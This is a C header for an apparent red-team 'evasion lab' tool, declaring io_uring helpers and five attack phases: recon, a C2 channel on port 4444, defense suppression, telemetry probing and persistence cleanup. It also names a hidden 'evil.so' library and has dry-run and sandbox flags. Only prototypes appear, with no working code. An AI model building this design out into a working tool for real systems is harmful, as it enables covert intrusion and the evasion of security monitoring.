#ifndef EVASION_LAB_H
#define EVASION_LAB_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <ctype.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <liburing.h>

#define VERSION_STRING  "2.1.0"
#define TOOL_NAME       "evasion_lab"

#define HIDDEN_FILE     "evil.so"
#define HOOKS_FILENAME  "libevasion_hooks.so"
#define OPS_FILENAME    "evasion_lab"
#define QUEUE_DEPTH     16
#define BUF_SIZE        65536
#define DEFAULT_C2_PORT 4444
#define SAFE_SANDBOX    "/tmp/evasion_lab"

typedef enum {
    MODE_INTERACTIVE = 0,
    MODE_BENCHMARK,
    MODE_TEST_PHASE,
    MODE_SIMULATE,
    MODE_CLEANUP
} lab_mode_t;

typedef struct {
    lab_mode_t mode;
    int phase;              /* 1-5 or 0 for all */
    int dry_run;            /* 1 = log actions without kernel/disk writes */
    int safe_mode;          /* 1 = use /tmp/evasion_lab instead of real /etc or /sys */
    int verbose;
    char c2_ip[64];
    int c2_port;
    char target_path[256];
} lab_config_t;

extern lab_config_t g_config;

/* io_uring helper operations */
int uring_init(struct io_uring *ring, unsigned entries);
void uring_cleanup(struct io_uring *ring);
int uring_open(struct io_uring *ring, const char *path, int flags, mode_t mode);
int uring_close(struct io_uring *ring, int fd);
int uring_unlink(struct io_uring *ring, const char *path);
int uring_read_file(struct io_uring *ring, const char *path, char *buf, size_t max_len);
int uring_write_file(struct io_uring *ring, const char *path, const char *buf, size_t len, int flags, mode_t mode);
int uring_write_to_fd(struct io_uring *ring, int fd, const char *buf, size_t len);
int uring_connect(struct io_uring *ring, const char *ip, int port);
int uring_send_all(struct io_uring *ring, int fd, const char *buf, size_t len);
int uring_recv(struct io_uring *ring, int fd, char *buf, size_t len);

/* Phase execution prototypes */
void phase1_init_recon(struct io_uring *ring);
void phase2_c2_channel(struct io_uring *ring, const char *c2_ip, int port);
void phase3_defense_suppression(struct io_uring *ring);
void phase4_telemetry_probe(struct io_uring *ring);
void phase5_persistence_cleanup(struct io_uring *ring);

/* Utility functions */
void setup_safe_sandbox(void);
void remove_safe_sandbox(void);
void print_banner(void);

#endif /* EVASION_LAB_H */
